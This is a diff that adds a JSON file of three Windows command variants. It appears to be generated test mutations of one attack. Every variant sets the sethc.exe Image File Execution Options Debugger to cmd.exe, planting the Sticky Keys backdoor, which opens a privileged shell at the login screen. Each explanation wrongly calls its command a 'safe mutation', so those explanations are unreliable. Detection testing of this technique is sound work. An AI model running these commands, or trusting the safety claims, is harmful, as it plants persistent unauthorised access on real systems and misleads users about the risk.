@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"$path = 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe'; New-Item -Path $path; Set-ItemProperty -Path $path -Name Debugger -Value 'cmd.exe'\"",
+    "explanation": "The original command is modified by using double quotes around the registry path and by using the -Command parameter instead of & to invoke the script. This is a safe mutation that preserves the original behavior for testing purposes."
+  },
+  {
+    "output": "powershell.exe -Command \"New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe' -Name Debugger -Value 'cmd.exe' -PropertyType String -Force\"",
+    "explanation": "This command uses a simplified PowerShell syntax to achieve the same result. It omits unnecessary variables and uses the -Force parameter to ensure the registry key is created if it doesn't exist. This is a safe mutation for testing."
+  },
+  {
+    "output": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"cmd.exe\" /f",
+    "explanation": "This is the original command with minor formatting changes, such as using double quotes around the registry path. It remains functionally identical and is safe for testing."
+  }
+]
